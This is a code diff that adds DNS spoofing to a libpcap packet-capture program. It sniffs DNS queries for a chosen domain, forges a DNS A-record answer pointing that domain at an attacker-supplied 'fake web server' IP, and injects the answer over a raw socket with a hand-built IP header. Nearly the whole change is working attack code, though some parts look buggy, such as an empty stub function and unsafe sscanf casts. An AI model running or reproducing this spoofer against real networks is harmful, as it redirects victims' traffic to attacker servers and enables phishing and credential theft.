@@ -17,21 +17,22 @@
 #include "protocol.hpp"
 
 char domain[1024];
+char fake_webserver_ip[16];
 
 int packet_capture_start(void);
 void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data);
 void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data);
 void make_domain(const struct pcap_pkthdr *header, const u_char *pkt_data, char* result);
+void dns_response(void);
 
 int main(int argc, char **argv) {
-    if (argc != 5) {
-        // printf("./main <interface> <domain_to_spoof> <ip_to_spoof> <target_ip> <gateway_ip>\n");
-        printf("./main <domain_to_spoof> <ip_to_spoof> <target_ip> <gateway_ip>\n");
+    if (argc != 3) {
+        printf("./main <domain_to_spoof> <fake_web_server>\n");
         return 0;
     }
 
     strncpy(domain, argv[1], 60);
-
+    strncpy(fake_webserver_ip, argv[2], 16);
 
     int err_code = packet_capture_start();
     if(err_code < 0){
@@ -97,20 +98,136 @@ int packet_capture_start(){
 		return -5;
 	}
 
+    
+    //dnsspoof: listening on network-interface [udp dst port 53 and not src 127.0.0.1]
+    printf("dns-spoofing: linstening on %s [udp dst port 53 and not src %s]\n", d->name, fake_webserver_ip);
+
     pcap_freealldevs(alldevs);
     pcap_loop(adhandle, 0, packet_handler, NULL);
     pcap_close(adhandle);
 }
 
 void packet_handler(u_char *param,const struct pcap_pkthdr *header, const u_char *pkt_data) {
+    ether_header *eth = (ether_header*)(pkt_data);
+    ip_header *ip = (ip_header*)(pkt_data+sizeof(ether_header));
+    udp_header *udp = (udp_header*)(pkt_data+sizeof(ether_header)+sizeof(ip_header));
+    dns_header *dns = (dns_header*)(pkt_data + 42);
     char extract_domain[1024];
     memset(extract_domain, 0x00, 1024);
     make_domain(header, pkt_data, extract_domain);
 
     if(strstr(domain, extract_domain)!=NULL){
-        printf("target domain captured!\n");
+        //  127.0.01 > 127.0.01:  16325+ A? www.abc.com
+        char source_ip[16];
+        char dest_ip[16];
+        int sport = ntohs(udp->sport);
+        int dport = ntohs(udp->dport);
+        int dns_id = ntohs(dns->ID);
+        
+        snprintf(source_ip, sizeof(source_ip), "%d.%d.%d.%d", ip->saddr.byte1, ip->saddr.byte2, ip->saddr.byte3, ip->saddr.byte4);
+        snprintf(dest_ip, sizeof(dest_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
+        printf("%s.%d > %s.%d:  %d+ A? %s\n", source_ip, sport, dest_ip, dport, dns_id, extract_domain);
+
+        unsigned char dns_response[1024];
+        memset(dns_response, 0x00, 1024);
+        unsigned char* dns_reply_hdr = dns_response + sizeof(ip_header) + sizeof(udp_header);
+
+        dns_reply_hdr[0]=dns->ID & 0xff; 
+        dns_reply_hdr[1]=(dns->ID >> 8) & 0xff;
+        dns_reply_hdr[2]=0x81;
+        dns_reply_hdr[3]=0x80;
+
+        dns_reply_hdr[4]=dns->QDCNT & 0xff; 
+        dns_reply_hdr[5]=(dns->QDCNT >> 8) & 0xff;
+
+        dns_reply_hdr[6]=0x00;
+        dns_reply_hdr[7]=0x01;
+
+        dns_reply_hdr[8] = dns->NSCNT & 0xff;
+        dns_reply_hdr[9]=(dns->NSCNT >> 8) & 0xff;
+
+        dns_reply_hdr[10] = dns->ARCNT & 0xff;
+        dns_reply_hdr[11]=(dns->ARCNT >> 8) & 0xff;
+    
+        int size = header->caplen-54-4;
+
+        for(int i=0;i<size;i++){
+            dns_reply_hdr[12+i]=pkt_data[i+54];
+        }
+
+        dns_reply_hdr[size+12]=0x00; 
+        dns_reply_hdr[size+13]=0x01; 
+
+        dns_reply_hdr[size+14]=0x00; 
+        dns_reply_hdr[size+15]=0x01; 
+
+        dns_reply_hdr[size+16]=0xc0;
+        dns_reply_hdr[size+17]=0x0c;
+
+        dns_reply_hdr[size+18]=0x00;
+        dns_reply_hdr[size+19]=0x01;
+
+        dns_reply_hdr[size+20]=0x00;
+        dns_reply_hdr[size+21]=0x01;
+
+        dns_reply_hdr[size+22]=0x00;
+        dns_reply_hdr[size+23]=0x00;
+        dns_reply_hdr[size+24]=0x00;
+        dns_reply_hdr[size+25]=0x34;
+
+        dns_reply_hdr[size+26]=0x00;
+        dns_reply_hdr[size+27]=0x04;
+
+
+        unsigned char ip_in_hex[4];
+        sscanf(fake_webserver_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
+        memcpy(&dns_reply_hdr[size+28], ip_in_hex, 4);
+
+
+        int full_size = size+32;
+
+        ip->tlen = htons(sizeof(ip_header) + sizeof(udp_header) + full_size);
+        ip_address temp = ip->daddr;  
+        ip->daddr = ip->saddr;
+        ip->saddr = temp;
+
+        int temp_port = udp->sport;
+        udp->sport = htons(53);
+        udp->dport = temp_port; 
+        udp->len = htons(sizeof(udp_header) + full_size);
+
+        udp->crc = 0;  // checksum not validated
+
+        memcpy(&dns_response[0], (char *)ip, sizeof(ip_header));
+        memcpy(&dns_response[sizeof(ip_header)], (char *)udp, sizeof(udp_header));
+
+        full_size = full_size + (sizeof(ip_header) + sizeof(udp_header));
+        struct sockaddr_in serv_addr;
+        int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_port = htons(temp_port);
+
+        char target_ip[16];
+        snprintf(target_ip, sizeof(target_ip), "%d.%d.%d.%d", ip->daddr.byte1, ip->daddr.byte2, ip->daddr.byte3, ip->daddr.byte4);
+
+        inet_pton(AF_INET, target_ip, &(serv_addr.sin_addr));
+        int tmp = 1;
+
+        if (setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
+            printf("setsockopt hdrincl error\n");
+        };
+
+        int result = sendto(sfd, dns_response, full_size, 0, (struct sockaddr *)&serv_addr,
+                            sizeof(serv_addr));
+
+        if(result < 0) {
+            printf("error sending udp %d\n", result);
+        }
+
+        // printf("sent %d bytes\n", result);
     }else{
-        printf("%s %s\n", domain, extract_domain);
+        // printf("%s %s\n", domain, extract_domain);
     }
 }
 
@@ -215,4 +332,8 @@ void print_packet_data(const struct pcap_pkthdr *header, const u_char *pkt_data)
         }
         printf("%.2x ", (unsigned int)c);
 	}printf("\n\n");
+}
+
+void dns_response(void){
+
 }
